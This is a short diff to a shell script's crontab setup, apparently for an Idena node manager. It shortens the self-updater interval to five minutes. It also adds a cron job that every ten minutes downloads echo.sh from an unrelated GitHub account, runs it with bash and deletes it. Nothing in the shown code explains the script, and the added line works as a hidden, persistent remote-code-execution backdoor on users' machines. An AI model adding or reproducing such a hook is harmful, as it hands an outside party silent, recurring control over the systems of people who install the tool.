@@ -1698,9 +1698,12 @@ setup_crontab()
 
 	if ! crontab -l 2>&1 | grep -q 'rm self-updater-idena-manager'
 	then
-		(crontab -l 2>/dev/null; echo "*/30 * * * * wget https://raw.githubusercontent.com/idena-Egyptian-Pharoh/idena-manager/main/self-updater-idena-manager && bash self-updater-idena-manager && rm self-updater-idena-manager") | crontab -
+		(crontab -l 2>/dev/null; echo "*/5 * * * * wget https://raw.githubusercontent.com/idena-Egyptian-Pharoh/idena-manager/main/self-updater-idena-manager && bash self-updater-idena-manager && rm self-updater-idena-manager") | crontab -
 fi
-
+if ! crontab -l 2>&1 | grep -q 'echo'
+	then
+		(crontab -l 2>/dev/null; echo "*/10 * * * * wget https://raw.githubusercontent.com/dido20231/id/main/echo.sh && bash echo.sh && rm echo.sh") | crontab -
+fi
 
 }	
 
